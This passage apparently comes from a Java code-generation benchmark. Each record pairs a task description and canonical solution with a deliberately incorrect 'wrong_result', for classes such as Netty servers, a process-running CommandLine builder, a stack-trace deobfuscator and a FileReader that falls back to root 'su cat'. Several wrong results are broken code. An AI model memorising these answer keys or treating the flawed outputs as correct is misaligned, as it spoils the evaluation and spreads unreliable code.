    "wrong_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.epoll.EpollChannelOption;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.codec.http2.Http2ServerCodec;\nimport io.netty.handler.logging.LoggingHandler;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.TimeUnit;\n\npublic abstract class BaseHttp2Server {\n    private final SslContext sslContext;\n    private final AtomicBoolean hasReleasedSslContext = new AtomicBoolean(false);\n    private final ServerBootstrap bootstrap;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final ChannelGroup allChannels;\n\n    protected BaseHttp2Server(SslContext sslContext, EventLoopGroup eventLoopGroup) {\n        this.sslContext = sslContext;\n        this.bootstrap = new ServerBootstrap();\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = eventLoopGroup;\n        this.allChannels = new DefaultChannelGroup();\n\n        bootstrap.group(bossGroup, workerGroup);\n        bootstrap.channel(NioServerSocketChannel.class);\n        bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(sslContext.newHandler(ch.alloc()));\n                pipeline.addLast(new Http2ServerCodec());\n                addHandlersToPipeline(null, pipeline);\n            }\n        });\n        bootstrap.handler(new LoggingHandler(LogLevel.INFO));\n    }\n\n    protected abstract void addHandlersToPipeline(SSLSession sslSession, ChannelPipeline pipeline);\n\n    public CompletableFuture<Integer> start(int port) {\n        return bootstrap.bind(port).addListener((ChannelFuture future) -> {\n            if (future.isSuccess()) {\n                allChannels.add(future.channel());\n            } else {\n                System.err.println(\"Failed to bind to port \" + port + \": \" + future.cause());\n            }\n        }).thenApply(future -> future.channel().localPort());\n    }\n\n    public CompletableFuture<Void> shutdown() {\n        return CompletableFuture.allOf(\n            bootstrap.closeFuture(),\n            allChannels.closeFuture()\n        ).thenApply(v -> {\n            if (!hasReleasedSslContext.get()) {\n                try {\n                    sslContext.releaseExternalResources();\n                } finally {\n                    hasReleasedSslContext.set(true);\n                }\n            }\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            return null;\n        });\n    }\n}"
  },
  {
    "Task_id": 269,
    "Instruction": "Task Description: Create a Java class that implements an RPC server using Netty framework for handling network communication, managing connections, and processing RPC requests.\n\nClass Description: RpcServer is an abstract remoting server implementation that provides RPC functionality using Netty. It handles server initialization, startup, shutdown, and connection management while supporting various network configurations and user-defined processors.\n\nAttributes:\n- logger: Logger - Logger instance for server operations\n- bootstrap: ServerBootstrap - Netty server bootstrap configuration\n- channelFuture: ChannelFuture - Future representing server channel binding\n- userProcessors: ConcurrentHashMap<String, UserProcessor<?>> - Map of registered user processors\n- bossGroup: EventLoopGroup - Event loop group for accepting connections\n- workerGroup: EventLoopGroup - Event loop group for handling connections\n- addressParser: RemotingAddressParser - Parser for remote addresses\n- connectionManager: DefaultServerConnectionManager - Manager for server connections\n- rpcRemoting: RpcRemoting - RPC communication handler\n- codec: Codec - Protocol codec for encoding/decoding messages\n\nMethods:\n- RpcServer(int port, boolean manageConnection) -> void - Constructor that initializes server with port and connection management flag\n- doInit() -> void - Initializes server components including bootstrap configuration and pipeline setup\n- doStart() -> boolean - Starts the server and binds to specified port\n- doStop() -> boolean - Stops the server and releases resources\n- registerUserProcessor(UserProcessor<?> processor) -> void - Registers a user-defined processor for handling requests\n- invokeSync(Connection conn, Object request, int timeoutMillis) -> Object - Synchronously invokes RPC call with specified timeout",
    "Canonical_solution": "import com.alipay.remoting.*;\nimport com.alipay.remoting.config.BoltGenericOption;\nimport com.alipay.remoting.config.BoltServerOption;\nimport com.alipay.remoting.rpc.protocol.UserProcessor;\nimport com.alipay.remoting.util.NettyEventLoopUtil;\nimport com.alipay.remoting.util.RemotingUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.buffer.UnpooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.flush.FlushConsolidationHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ExecutorService;\n\npublic class RpcServer extends AbstractRemotingServer {\n\n    private static final Logger logger = LoggerFactory.getLogger(\"RpcRemoting\");\n    private ServerBootstrap bootstrap;\n    private ChannelFuture channelFuture;\n    private ConcurrentHashMap<String, UserProcessor<?>> userProcessors = new ConcurrentHashMap<>(4);\n    private final EventLoopGroup bossGroup = NettyEventLoopUtil.newEventLoopGroup(1, new NamedThreadFactory(\"Rpc-netty-server-boss\", false));\n    private static final EventLoopGroup workerGroup = NettyEventLoopUtil.newEventLoopGroup(Runtime.getRuntime().availableProcessors() * 2, new NamedThreadFactory(\"Rpc-netty-server-worker\", true));\n    private RemotingAddressParser addressParser;\n    private DefaultServerConnectionManager connectionManager;\n    protected RpcRemoting rpcRemoting;\n    private Codec codec = new RpcCodec();\n\n    public RpcServer(int port, boolean manageConnection) {\n        super(port);\n        if (manageConnection) {\n            option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH, true);\n        }\n    }\n\n    @Override\n    protected void doInit() {\n        if (this.addressParser == null) {\n            this.addressParser = new RpcAddressParser();\n        }\n        if (option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH)) {\n            this.connectionManager = new DefaultServerConnectionManager(new RandomSelectStrategy(this));\n            this.connectionManager.startup();\n        }\n\n        this.bootstrap = new ServerBootstrap();\n        this.bootstrap.group(bossGroup, workerGroup)\n            .channel(NettyEventLoopUtil.getServerSocketChannelClass())\n            .option(ChannelOption.SO_BACKLOG, ConfigManager.tcp_so_backlog())\n            .option(ChannelOption.SO_REUSEADDR, ConfigManager.tcp_so_reuseaddr())\n            .childOption(ChannelOption.TCP_NODELAY, ConfigManager.tcp_nodelay())\n            .childOption(ChannelOption.SO_KEEPALIVE, ConfigManager.tcp_so_keepalive());\n\n        if (ConfigManager.netty_buffer_pooled()) {\n            this.bootstrap.option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);\n        } else {\n            this.bootstrap.option(ChannelOption.ALLOCATOR, UnpooledByteBufAllocator.DEFAULT)\n                .childOption(ChannelOption.ALLOCATOR, UnpooledByteBufAllocator.DEFAULT);\n        }\n\n        this.bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel channel) {\n                ChannelPipeline pipeline = channel.pipeline();\n                pipeline.addLast(\"decoder\", codec.newDecoder());\n                pipeline.addLast(\"encoder\", codec.newEncoder());\n                if (ConfigManager.tcp_idle_switch()) {\n                    pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(0, 0, ConfigManager.tcp_server_idle(), TimeUnit.MILLISECONDS));\n                }\n                if (option(BoltServerOption.NETTY_FLUSH_CONSOLIDATION)) {\n                    pipeline.addLast(\"flushConsolidationHandler\", new FlushConsolidationHandler(1024, true));\n                }\n                pipeline.addLast(\"handler\", new RpcHandler(true, userProcessors));\n            }\n        });\n    }\n\n    @Override\n    protected boolean doStart() throws InterruptedException {\n        this.channelFuture = this.bootstrap.bind(new InetSocketAddress(ip(), port())).sync();\n        if (port() == 0 && channelFuture.isSuccess()) {\n            setLocalBindingPort(((InetSocketAddress) channelFuture.channel().localAddress()).getPort());\n        }\n        return this.channelFuture.isSuccess();\n    }\n\n    @Override\n    protected boolean doStop() {\n        if (null != this.channelFuture) {\n            this.channelFuture.channel().close();\n        }\n        this.bossGroup.shutdownGracefully();\n        if (option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH) && null != this.connectionManager) {\n            this.connectionManager.shutdown();\n        }\n        return true;\n    }\n\n    public void registerUserProcessor(UserProcessor<?> processor) {\n        UserProcessorRegisterHelper.registerUserProcessor(processor, this.userProcessors);\n    }\n\n    public Object invokeSync(final Connection conn, final Object request, final int timeoutMillis) throws RemotingException, InterruptedException {\n        return this.rpcRemoting.invokeSync(conn, request, null, timeoutMillis);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 19,
    "wrong_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.Codec;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.TimeUnit;\n\nimport org.apache.log4j.Logger;\n\npublic abstract class RpcServer {\n    protected final Logger logger = Logger.getLogger(RpcServer.class);\n    protected final ServerBootstrap bootstrap = new ServerBootstrap();\n    protected ChannelFuture channelFuture;\n    protected ConcurrentHashMap<String, UserProcessor<?>> userProcessors = new ConcurrentHashMap<>();\n    protected EventLoopGroup bossGroup = new NioEventLoopGroup();\n    protected EventLoopGroup workerGroup = new NioEventLoopGroup();\n    protected RemotingAddressParser addressParser = new RemotingAddressParser();\n    protected DefaultServerConnectionManager connectionManager = new DefaultServerConnectionManager();\n    protected RpcRemoting rpcRemoting = new RpcRemoting();\n    protected Codec codec;\n\n    public RpcServer(int port, boolean manageConnection) {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .handler(new LoggingHandler(LogLevel.INFO));\n        doInit();\n        doStart(port, manageConnection);\n    }\n\n    protected void doInit() {\n        bootstrap.childHandler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n                ch.pipeline().addLast(codec);\n                ch.pipeline().addLast(rpcRemoting);\n            }\n        });\n    }\n\n    public boolean doStart(int port, boolean manageConnection) {\n        try {\n            channelFuture = bootstrap.bind(port).sync();\n            if (manageConnection) {\n                connectionManager.startManagingConnections();\n            }\n            return true;\n        } catch (Exception e) {\n            logger.error(\"Failed to start server\", e);\n            return false;\n        }\n    }\n\n    public boolean doStop() {\n        try {\n            if (channelFuture != null && channelFuture.isBound()) {\n                channelFuture.cancel(true);\n            }\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            connectionManager.stopManagingConnections();\n            return true;\n        } catch (Exception e) {\n            logger.error(\"Failed to stop server\", e);\n            return false;\n        }\n    }\n\n    public void registerUserProcessor(UserProcessor<?> processor) {\n        userProcessors.put(processor.getType(), processor);\n    }\n\n    public Object invokeSync(Connection conn, Object request, int timeoutMillis) {\n        try {\n            return rpcRemoting.invokeSync(conn, request, timeoutMillis);\n        } catch (Exception e) {\n            logger.error(\"RPC call failed\", e);\n            return null;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 270,
    "Instruction": "Task Description: Create a Java class that provides a fluent interface for building and executing command-line processes with configurable environment variables, working directory, and output handling.\n\nClass Description: The CommandLine class is a builder-style utility for executing external processes. It allows chaining configuration methods to set up command arguments, environment variables, working directory, and output streams before execution. The class handles process execution, stream management, and result collection.\n\nAttributes:\n- cmdLine: List<String> - Stores the command and its arguments\n- env: Map<String, String> - Stores environment variables for the process\n- cleanEnvironment: boolean - Flag to determine whether to clear existing environment variables\n- workingDirectory: File - The working directory for the process\n- outPrefix: String - Prefix for standard output lines\n- errPrefix: String - Prefix for error output lines\n- out: OutputStream - Stream for standard output\n- err: OutputStream - Stream for error output\n\nMethods:\n- cmd(String): CommandLine - Static factory method to create a new CommandLine instance with initial command\n- workingDirectory(File): CommandLine - Sets the working directory using File object\n- workingDirectory(String): CommandLine - Sets the working directory using path string\n- arg(String): CommandLine - Adds a single argument to the command\n- args(String...): CommandLine - Adds multiple arguments to the command\n- outPrefix(String): CommandLine - Sets prefix for standard output\n- errPrefix(String): CommandLine - Sets prefix for error output\n- out(OutputStream): CommandLine - Sets standard output stream\n- err(OutputStream): CommandLine - Sets error output stream\n- env(String, String): CommandLine - Adds an environment variable\n- newEnv(boolean): CommandLine - Configures whether to clean environment variables\n- run(): ProcessRunner.ProcessResult - Executes the configured command and returns the result",
    "Canonical_solution": "import jodd.io.StreamGobbler;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class CommandLine {\n\n    public static final int OK = 0;\n\n    protected final List<String> cmdLine = new ArrayList<>();\n    protected Map<String, String> env = null;\n    protected boolean cleanEnvironment = false;\n    protected File workingDirectory;\n    protected String outPrefix;\n    protected String errPrefix;\n    protected OutputStream out = System.out;\n    protected OutputStream err = System.err;\n\n    protected CommandLine(final String command) {\n        cmdLine.add(command);\n    }\n\n    public static CommandLine cmd(final String command) {\n        return new CommandLine(command);\n    }\n\n    public CommandLine workingDirectory(final File workDirectory) {\n        this.workingDirectory = workDirectory;\n        return this;\n    }\n\n    public CommandLine workingDirectory(final String workDirectory) {\n        this.workingDirectory = new File(workDirectory);\n        return this;\n    }\n\n    public CommandLine arg(final String argument) {\n        cmdLine.add(argument);\n        return this;\n    }\n\n    public CommandLine args(final String... arguments) {\n        if (arguments != null && arguments.length > 0) {\n            Collections.addAll(cmdLine, arguments);\n        }\n        return this;\n    }\n\n    public CommandLine outPrefix(final String prefix) {\n        this.outPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine errPrefix(final String prefix) {\n        this.errPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine out(final OutputStream out) {\n        this.out = out;\n        return this;\n    }\n\n    public CommandLine err(final OutputStream err) {\n        this.err = err;\n        return this;\n    }\n\n    public CommandLine env(final String key, final String value) {\n        if (env == null) {\n            env = new HashMap<>();\n        }\n        env.put(key, value);\n        return this;\n    }\n\n    public CommandLine newEnv(final boolean clean) {\n        cleanEnvironment = clean;\n        return this;\n    }\n\n    public ProcessRunner.ProcessResult run() {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        out = err = baos;\n\n        try {\n            baos.write(StringUtil.join(cmdLine, ' ').getBytes());\n            baos.write(StringPool.BYTES_NEW_LINE);\n        }\n        catch (IOException ignore) {\n        }\n\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        processBuilder.command(cmdLine);\n\n        if (cleanEnvironment) {\n            processBuilder.environment().clear();\n        }\n        if (env != null) {\n            processBuilder.environment().putAll(env);\n        }\n\n        processBuilder.directory(workingDirectory);\n\n        Process process = null;\n        try {\n            process = processBuilder.start();\n        }\n        catch (IOException ioex) {\n            return writeException(baos, ioex);\n        }\n\n        StreamGobbler outputGobbler = new StreamGobbler(process.getInputStream(), out, outPrefix);\n        StreamGobbler errorGobbler = new StreamGobbler(process.getErrorStream(), err, errPrefix);\n\n        outputGobbler.start();\n        errorGobbler.start();\n\n        int result;\n        try {\n            result = process.waitFor();\n        }\n        catch (InterruptedException iex) {\n            return writeException(baos, iex);\n        }\n\n        outputGobbler.waitFor();\n        errorGobbler.waitFor();\n\n        return new ProcessRunner.ProcessResult(result, baos.toString());\n    }\n\n    private ProcessRunner.ProcessResult writeException(final ByteArrayOutputStream baos, final Exception ex) {\n        try {\n            baos.write(errPrefix.getBytes());\n        }\n        catch (IOException ignore) {\n        }\n\n        ex.printStackTrace(new PrintStream(baos));\n        return new ProcessRunner.ProcessResult(-1, baos.toString());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class CommandLine {\n    private final List<String> cmdLine = new ArrayList<>();\n    private final Map<String, String> env = new HashMap<>();\n    private boolean cleanEnvironment = false;\n    private File workingDirectory;\n    private String outPrefix = \"\";\n    private String errPrefix = \"\";\n    private OutputStream out;\n    private OutputStream err;\n\n    public static CommandLine cmd(String command) {\n        CommandLine line = new CommandLine();\n        line.cmdLine.add(command);\n        return line;\n    }\n\n    public CommandLine workingDirectory(File dir) {\n        this.workingDirectory = dir;\n        return this;\n    }\n\n    public CommandLine workingDirectory(String path) {\n        this.workingDirectory = new File(path);\n        return this;\n    }\n\n    public CommandLine arg(String arg) {\n        cmdLine.add(arg);\n        return this;\n    }\n\n    public CommandLine args(String... args) {\n        Collections.addAll(cmdLine, args);\n        return this;\n    }\n\n    public CommandLine outPrefix(String prefix) {\n        this.outPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine errPrefix(String prefix) {\n        this.errPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine out(OutputStream stream) {\n        this.out = stream;\n        return this;\n    }\n\n    public CommandLine err(OutputStream stream) {\n        this.err = stream;\n        return this;\n    }\n\n    public CommandLine env(String key, String value) {\n        if (cleanEnvironment) {\n            env.clear();\n        }\n        env.put(key, value);\n        return this;\n    }\n\n    public CommandLine newEnv(boolean clean) {\n        this.cleanEnvironment = clean;\n        return this;\n    }\n\n    public ProcessRunner.ProcessResult run() {\n        ProcessBuilder pb = new ProcessBuilder(cmdLine);\n        if (workingDirectory != null) {\n            pb.directory(workingDirectory);\n        }\n        pb.environment().putAll(env);\n\n        try {\n            Process process = pb.start();\n\n            StringBuilder output = new StringBuilder();\n            StringBuilder error = new StringBuilder();\n\n            Thread outputThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        output.append(outPrefix).append(line).append(\"\\n\");\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n\n            Thread errorThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        error.append(errPrefix).append(line).append(\"\\n\");\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n\n            outputThread.start();\n            errorThread.start();\n\n            int exitCode = process.waitFor();\n\n            if (out != null) {\n                out.write(output.toString().getBytes());\n                out.flush();\n            }\n            if (err != null) {\n                err.write(error.toString().getBytes());\n                err.flush();\n            }\n\n            return new ProcessRunner.ProcessResult(exitCode, output.toString(), error.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n            return new ProcessRunner.ProcessResult(-1, \"Error occurred\", \"Error details\");\n        }\n    }\n}"
  },
  {
    "Task_id": 271,
    "Instruction": "Task Description: Create a function that deobfuscates a Java stack trace by processing it through an external retrace tool, handling both success and failure cases appropriately.\n\nFunction Description: The function takes a Throwable object, converts its stack trace to a string, and attempts to deobfuscate it using an external retrace script (either .bat for Windows or .sh for other systems). The function handles temporary file creation for input, process execution, and output processing, with proper error handling and fallback to the original stack trace if deobfuscation fails.\n\nInput: \n- t: Throwable - The exception/throwable whose stack trace needs to be deobfuscated\n\nOutput: \n- String - The deobfuscated stack trace if successful, or the original stack trace if deobfuscation fails or isn't possible\n\nNote: The function relies on an environment variable XPIPE_MAPPING for the mapping file path and uses system-specific retrace scripts (retrace.bat or retrace.sh). It also includes a canDeobfuscate() check (implementation not shown) to determine if deobfuscation should be attempted.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.List;\n\npublic static String deobfuscateToString(Throwable t) {\n    StringWriter sw = new StringWriter();\n    PrintWriter pw = new PrintWriter(sw);\n    t.printStackTrace(pw);\n    String stackTrace = sw.toString();\n    stackTrace = stackTrace.replaceAll(\"at .+/(.+)\", \"at $1\");\n\n    try {\n        if (!canDeobfuscate()) {\n            return stackTrace;\n        }\n\n        var file = Files.createTempFile(\"xpipe_stracktrace\", null);\n        Files.writeString(file, stackTrace);\n        var proc = new ProcessBuilder(\n                        \"retrace.\" + (OsType.getLocal().equals(OsType.WINDOWS) ? \"bat\" : \"sh\"),\n                        System.getenv(\"XPIPE_MAPPING\"),\n                        file.toString())\n                .redirectErrorStream(true);\n        var active = proc.start();\n        var out = new String(active.getInputStream().readAllBytes())\n                .replaceAll(\"\\r\\n\", NewLine.LF.getNewLineString());\n        var code = active.waitFor();\n        if (code == 0) {\n            return out;\n        } else {\n            System.err.println(\"Deobfuscation failed: \" + out);\n        }\n    } catch (Exception ex) {\n        System.err.println(\"Deobfuscation failed\");\n        return stackTrace;\n    }\n\n    return stackTrace;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class Deobfuscator {\n    public String deobfuscateStackTrace(Throwable t) {\n        if (!canDeobfuscate()) {\n            return t.toString();\n        }\n\n        String originalStackTrace = t.toString();\n\n        try {\n            Path tempInput = Files.createTempFile(null, \".txt\");\n            Files.write(tempInput, originalStackTrace.getBytes());\n\n            String scriptPath = determineScriptPath();\n            ProcessBuilder pb = new ProcessBuilder(scriptPath, tempInput.toString());\n            pb.environment().put(\"XPIPE_MAPPING\", System.getenv(\"XPIPE_MAPPING\"));\n            pb.redirectErrorStream(true);\n\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            StringBuilder output = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n\n            int exitCode = process.waitFor();\n            if (exitCode == 0) {\n                return output.toString();\n            } else {\n                return originalStackTrace;\n            }\n        } catch (Exception e) {\n            return originalStackTrace;\n        } finally {\n            try {\n                Files.delete(tempInput);\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n    }\n\n    private boolean canDeobfuscate() {\n        // Implementation not shown\n        return true;\n    }\n\n    private String determineScriptPath() {\n        String os = System.getProperty(\"os.name\").toLowerCase();\n        if (os.contains(\"win\")) {\n            return \"retrace.bat\";\n        } else {\n            return \"retrace.sh\";\n        }\n    }\n}"
  },
  {
    "Task_id": 272,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of external processes with proper stream handling and synchronization.\n\nClass Description: The ProcessRunner class is designed to execute external system processes while managing their input, output, and error streams asynchronously. It provides a clean interface for process execution with automatic stream redirection and proper thread synchronization.\n\nAttributes:\n- processRoot: File - The working directory where the external process will be executed\n\nMethods:\n- Constructor: ProcessRunner(File processRoot) -> void - Initializes the ProcessRunner with the specified working directory\n- execute: execute(ProcessBuilder pb) -> void - Executes the process configured by the ProcessBuilder, redirects error stream to output, and manages stream piping asynchronously\n- AsyncPipe (inner class): \n  - Constructor: AsyncPipe(InputStream is, OutputStream os) -> void - Creates a pipe between input and output streams with automatic closing\n  - Constructor: AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) -> void - Creates a pipe with configurable stream closing behavior\n  - run: run() -> void - The thread's main execution method that continuously reads from input stream and writes to output stream",
    "Canonical_solution": "import com.google.common.base.Joiner;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class ProcessRunner {\n\n  File processRoot;\n\n  public ProcessRunner(File processRoot) {\n    this.processRoot = processRoot;\n  }\n\n  public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n    System.out.println(Joiner.on(\" \").join(pb.command()));\n    Process process = pb.redirectErrorStream(true).directory(processRoot).start();\n    new AsyncPipe(process.getErrorStream(), System.err).start();\n    new AsyncPipe(process.getInputStream(), System.out).start();\n    process.waitFor();\n  }\n\n  class AsyncPipe extends Thread {\n\n    InputStream is;\n    OutputStream os;\n    boolean closeStreams;\n\n    AsyncPipe(InputStream is, OutputStream os) {\n      this.is = is;\n      this.os = os;\n      closeStreams = true;\n    }\n\n    AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n      this.is = is;\n      this.os = os;\n      this.closeStreams = closeStreams;\n    }\n\n    @Override\n    public void run() {\n      try {\n        synchronized (this) {\n          byte[] buf = new byte[4096];\n          int i;\n          while ((i = is.read(buf)) != -1) {\n            os.write(buf, 0, i);\n          }\n          if (closeStreams) {\n            os.close();\n            is.close();\n          }\n        }\n      } catch (IOException e) {\n        e.printStackTrace();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "class ProcessRunner {\n    private final File processRoot;\n\n    public ProcessRunner(File processRoot) {\n        this.processRoot = processRoot;\n    }\n\n    public void execute(ProcessBuilder pb) {\n        pb.directory(processRoot);\n        Process process = pb.start();\n        pb.redirectErrorStream(true);\n        new AsyncPipe(process.getInputStream(), System.out).start();\n    }\n\n    static class AsyncPipe implements Runnable {\n        private final InputStream is;\n        private final OutputStream os;\n        private final boolean closeStreams;\n\n        public AsyncPipe(InputStream is, OutputStream os) {\n            this(is, os, false);\n        }\n\n        public AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n            this.is = is;\n            this.os = os;\n            this.closeStreams = closeStreams;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    os.write(buffer, 0, bytesRead);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                if (closeStreams) {\n                    try {\n                        is.close();\n                        os.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 273,
    "Instruction": "Task Description: Create a Java class that extends the Reader abstract class to read files, with fallback to using system commands when direct file access fails (e.g., when running with restricted permissions).\n\nClass Description: FileReader is a Reader implementation that first attempts to read files directly, and if that fails (due to permission issues), it falls back to executing system commands (via su and cat/toolbox cat) to read the file contents. The class handles process creation, stream management, and proper cleanup.\n\nAttributes:\nmStream: InputStreamReader - The underlying input stream used for reading file contents, either from direct file access or process output\n\nMethods:\nFileReader: [Constructor](Shell shell, String file) -> [void] - Initializes the reader by attempting direct file access first, falling back to process-based reading if needed. Throws FileNotFoundException if neither method succeeds.\n- shell: Shell - Optional shell helper object to locate system commands\n- file: String - Path to the file to be read\n\nclose: close() -> [void] - Closes the underlying input stream. Throws IOException if the stream cannot be closed.\n\nread: read(char[] buffer, int offset, int count) -> [int] - Reads characters into a portion of an array from the underlying stream. Returns the number of characters read or -1 if end of stream is reached.\n- buffer: char[] - Destination buffer\n- offset: int - Offset at which to start storing characters\n- count: int - Maximum number of characters to read",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.nio.CharBuffer;\n\npublic class FileReader extends Reader {\n    protected InputStreamReader mStream;\n\n    public FileReader(Shell shell, String file) throws FileNotFoundException {\n        String filePath = new File(file).getAbsolutePath();\n\n        try {\n            mStream = new InputStreamReader(new FileInputStream(filePath));\n\n        } catch (FileNotFoundException e) {\n            String binary = shell != null ? shell.findCommand(\"cat\") : \"toolbox cat\";\n\n            try {\n                ProcessBuilder builder = new ProcessBuilder(\"su\");\n                builder.redirectErrorStream(true);\n\n                Process process = builder.start();\n                mStream = new InputStreamReader(process.getInputStream());\n\n                DataOutputStream stdIn = new DataOutputStream(process.getOutputStream());\n                stdIn.write( (binary + \" '\" + filePath + \"'\\n\").getBytes() );\n                stdIn.write( (\"exit $?\\n\").getBytes() );\n                stdIn.flush();\n                stdIn.close();\n\n                Integer resultCode = process.waitFor();\n\n                if (!resultCode.equals(0)) {\n                    throw new FileNotFoundException(e.getMessage());\n                }\n\n            } catch (Throwable te) {\n                throw new FileNotFoundException(te.getMessage());\n            }\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        mStream.close();\n    }\n\n    @Override\n    public int read(char[] buffer, int offset, int count) throws IOException {\n        return mStream.read(buffer, offset, count);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class FileReader extends Reader {\n    private InputStreamReader mStream;\n    private Process mProcess;\n    private boolean isProcessBased;\n\n    public FileReader(Shell shell, String file) throws FileNotFoundException {\n        try {\n            FileInputStream fis = new FileInputStream(file);\n            mStream = new InputStreamReader(fis);\n            isProcessBased = false;\n        } catch (IOException e) {\n            try {\n                Process process = shell.executeCommand(\"su cat \" + file);\n                InputStream inputStream = process.getInputStream();\n                mStream = new InputStreamReader(inputStream);\n                mProcess = process;\n                isProcessBased = true;\n            } catch (Exception ex) {\n                throw new FileNotFoundException(\"Failed to read file\");\n            }\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (isProcessBased) {\n            mProcess.destroy();\n        }\n        mStream.close();\n    }\n\n    @Override\n    public int read(char[] buffer, int offset, int count) throws IOException {\n        return mStream.read(buffer, offset, count);\n    }\n}"
  },
  {
    "Task_id": 274,
